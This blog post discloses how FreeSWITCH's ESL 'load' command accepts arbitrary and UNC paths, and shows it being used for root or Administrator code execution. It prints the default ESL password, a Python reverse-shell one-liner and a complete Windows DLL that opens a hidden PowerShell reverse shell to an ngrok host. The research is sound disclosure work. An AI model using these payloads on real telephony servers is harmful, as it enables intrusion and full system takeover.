---
author: Julio
date: 2026-04-11
title: "Loading Modules From Untrusted Paths to Achieve RCE/Privilege Escalation in FreeSWITCH"
image: /assets/images/freeswitch_ways_to_rce.svg
---

<p style="text-align: center"><img src="/assets/images/freeswitch_ways_to_rce.svg" alt="Diagram showing FreeSwitch's exploitation path" width="650"></p>

# Loading Modules From Untrusted Paths to Achieve RCE/Privilege Escalation in FreeSWITCH

## TL;DR

FreeSWITCH's ESL API accepts the `load` command with arbitrary file paths, including UNC paths on Windows, with no integrity checks or directory restrictions. An attacker with API access can load a malicious `.so` or `.dll` to execute code as the FreeSWITCH process. On Linux, this is a privilege escalation path for a low-privileged user with filesystem access; it can also enable RCE if another service running on the same host - such as a web application with a file upload feature or an FTP server - allows an attacker to write arbitrary files to disk. On Windows, where UNC paths are accepted, the module can be hosted on a remote SMB server, enabling RCE without any filesystem access.

## Introduction

FreeSWITCH is an open-source, cross-platform telephony engine used to build voice, video, and messaging applications. It is widely deployed as a PBX, softswitch, or voicemail server, and exposes an Event Socket Library (ESL) API on port 8021 that allows programmatic control of the switch.

Not long ago, we were creating an integration with FreeSWITCH to allow our customers to use Rocket.Chat as a client. As part of the development process, the security team performed an assessment of FreeSWITCH, looking for possible misconfigurations and how to harden it.

One of the risks that we listed was the possibility of an attacker logging into FreeSWITCH’s ESL/API (port 8021) and issuing system commands with `system` or `bg_system` from the `mod_dptools` module. By reviewing FreeSWITCH’s code, we noticed that it was possible to disable system commands by adding the following values to `vars.xml`:

```xml
<X-PRE-PROCESS cmd="set" data="disable_system_api_commands=true"/>
<X-PRE-PROCESS cmd="set" data="disable_system_app_commands=true"/>
```

## Module Loading

I was then thinking about other attack paths that could be leveraged by an attacker with access to the API to execute system commands or run arbitrary code. I investigated how modules are loaded and unloaded and how one can create a new module and add it to FreeSWITCH. I found documentation on how to create new modules and saw that it’s recommended that the module be created under `freeswitch/src/mod/applications`.

Once FreeSWITCH is built, it appears that all the modules are stored as shared libraries in the same directory:

<p style="text-align: center"><img src="/assets/images/freeswitch_1.png" alt="FreeSWITCH modules directory" style="width: 750px; border: 1px solid white;"></p>

When trying to load a module that doesn’t exist, the following error is thrown:

<p style="text-align: center"><img src="/assets/images/freeswitch_2.png" alt="Module not found error" style="width: 750px; border: 1px solid white;"></p>

Looking at the code, I found the following snippet:

```c
if (switch_is_file_path(file)) {
		path = switch_core_strdup(loadable_modules.pool, file);
		file = (char *) switch_cut_path(file);
		if ((dot = strchr(file, '.'))) {
			*dot = '\0';
		}
	} else {
		if ((dot = strchr(file, '.'))) {
			*dot = '\0';
		}
		len = strlen(switch_str_nil(dir));
		len += strlen(file);
		len += 8;
		path = (char *) switch_core_alloc(loadable_modules.pool, len);
		switch_snprintf(path, len, "%s%s%s%s", switch_str_nil(dir), SWITCH_PATH_SEPARATOR, file, ext);
	}
```

And the following one:

```c
static inline switch_bool_t switch_is_file_path(const char *file)
{
	const char *e;
	int r;

	if (zstr(file)) {
		return SWITCH_FALSE;
	}

	while(*file == '{') {
		if ((e = switch_find_end_paren(file, '{', '}'))) {
			file = e + 1;
			while(*file == ' ') file++;
		}
	}

#ifdef WIN32
	r = (*file == '\\' || *(file + 1) == ':' || *file == '/' || strstr(file, SWITCH_URL_SEPARATOR));
#else
	r = ((*file == '/') || strstr(file, SWITCH_URL_SEPARATOR));
#endif

	return r ? SWITCH_TRUE : SWITCH_FALSE;
}
```

So it seems like FreeSWITCH accepts both filenames and full paths.

## Linux: Privilege Escalation (or RCE)

As there seems to be no integrity checks on the default modules being loaded, nor is loading restricted to a trusted directory, a malicious user with access to the API (by either using the default `ClueCon` password, brute-forcing it, or finding it by looting credentials in other files) would be able to load a malicious or backdoored module.

As an example, I copied `mod_dptools.c` and altered it to execute a reverse shell as soon as the module loads:

<p style="text-align: center"><img src="/assets/images/freeswitch_3.png" alt="Backdoored mod_dptools code" style="width: 750px; border: 1px solid white;"></p>

The decoded `base64` blob is a reverse shell payload:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

I then compiled this module as a `.so` file, saved it under `/tmp/mod_dptools.so` and initiated a listener as a low-privileged user inside the server with `nc -nvlp 9002`.

I compiled FreeSWITCH with its original code and started a new server. After that, I logged into the API, unloaded the `mod_dptools` module and loaded my backdoored module from `/tmp/mod_dptools.so`.

<p style="text-align: center"><img src="/assets/images/freeswitch_4.png" alt="Loading backdoored module" style="width: 750px; border: 1px solid white;"></p>

Once I loaded the backdoored module, I got a reverse shell connection as the root user:

<p style="text-align: center"><img src="/assets/images/freeswitch_5.png" alt="Reverse shell as root" style="width: 750px; border: 1px solid white;"></p>

An attacker targeting a FreeSWITCH server on Linux has two main paths. The first is privilege escalation: an attacker already on the system as a low-privileged user can write a malicious `.so` file anywhere on the filesystem - such as `/tmp` - and load it via the ESL API to execute code as the FreeSWITCH process, which is often observed running as `root`. The second is RCE: if another service on the same host allows writing arbitrary files to disk - such as a web application with a file upload feature or an FTP server - an attacker can drop a malicious module without needing existing shell access, then load it via ESL to achieve code execution.

## Windows: RCE via Remote SMB Share (as Administrator)

On Windows, however, this attack path is more interesting. When loading a module on Windows, FreeSWITCH accepts `\\` as the absolute path - which means it accepts UNC paths. My idea here was to test if FreeSWITCH would accept an external SMB server, which would mean that an attacker could host a malicious module on their own SMB server and, after logging into ESL, load to receive a reverse shell or deploy a C2 implant. This would be a more interesting attack path since the attacker wouldn't need access to the file system to load a module nor would they need access as a lower-privileged user.

I created the following module with a reverse shell payload:

```c
/*
 * mod_poc.c - FreeSWITCH PoC module
 *
 * Build:
 *   cmd /c "vcvarsall.bat amd64 && cl /LD mod_poc.c /Fe:mod_poc.dll"
 *
 * Load via ESL:
 *   api load \\localhost\share\mod_poc.dll
 */
#include <windows.h>

#define SWITCH_API_VERSION    5
#define SWITCH_STATUS_SUCCESS 0

/* Replace these before compiling */
#define NGROK_HOST "4.tcp.ngrok.io"
#define NGROK_PORT "19823"

typedef int          switch_status_t;
typedef unsigned int switch_module_flag_t;
typedef void         switch_loadable_module_interface_t;
typedef void         switch_memory_pool_t;

typedef switch_status_t (*switch_module_load_t)    (switch_loadable_module_interface_t **module_interface, switch_memory_pool_t *pool);
typedef switch_status_t (*switch_module_runtime_t) (void);
typedef switch_status_t (*switch_module_shutdown_t)(void);

typedef struct {
    int                      switch_api_version;
    switch_module_load_t     load;
    switch_module_shutdown_t shutdown;
    switch_module_runtime_t  runtime;
    switch_module_flag_t     flags;
} switch_loadable_module_function_table_t;

static switch_status_t mod_poc_load(switch_loadable_module_interface_t **module_interface,
                                    switch_memory_pool_t *pool)
{
    return SWITCH_STATUS_SUCCESS;
}

__declspec(dllexport) switch_loadable_module_function_table_t mod_poc_module_interface = {
    SWITCH_API_VERSION,
    mod_poc_load,
    NULL,
    NULL,
    0
};

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        char cmd[] =
            "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \""
            "$c=New-Object Net.Sockets.TCPClient('" NGROK_HOST "'," NGROK_PORT ");"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$r+='PS '+(pwd).Path+'> ';"
            "$e=([Text.Encoding]::ASCII).GetBytes($r);"
            "$s.Write($e,0,$e.Length);"
            "$s.Flush()}"
            "\"";

        CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    return TRUE;
}
```

And compiled it on a Windows machine:

```powershell
cmd /c '"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvarsall.bat" amd64 && cl /LD mod_poc.c /Fe:mod_poc.dll'
```

Then, I started an SMB share on the Windows target itself (localhost, but there's nothing in the code that shows that it wouldn't work with an external server), started a listener on my MacBook with `nc -l 9001` and started a redirector with `ngrok tcp 9001`. After that, I loaded the malicious module:

<p style="text-align: center"><img src="/assets/images/freeswitch_windows1.png" alt="Loading backdoored module on Windows" style="width: 750px; border: 1px solid white;"></p>

As seen below, I got a shell as the administrator account:

<p style="text-align: center"><img src="/assets/images/freeswitch_windows2.png" alt="Reverse shell connected" style="width: 750px; border: 1px solid white;"></p>

## Conclusion

I communicated this finding to the FreeSWITCH security team a year ago. They indicated that this is intended behavior and that the ability to load modules from arbitrary paths is by design - thus, no CVE was issued. Regardless, it was fun diving into FreeSWITCH's code and playing with possible attack paths.

Also, there's a part 2 of this post and you can see it here: [More Ways to Achieve RCE/Privesc in FreeSWITCH](https://bulio.io/cves-and-research/more-ways-of-achieving-rce-privesc-in-freeswitch/).


PS: Everything in this article was tested on a vanilla installation of FreeSWITCH v1.10.12 running as the `root` user (Linux) / `Administrator` user (Windows).

## References

- [https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/)
- [https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Client-and-Developer-Interfaces/Event-Socket-Library/](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Client-and-Developer-Interfaces/Event-Socket-Library/)
- [https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Community/Contributing-Code/Creating-New-Modules/](https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Community/Contributing-Code/Creating-New-Modules/)
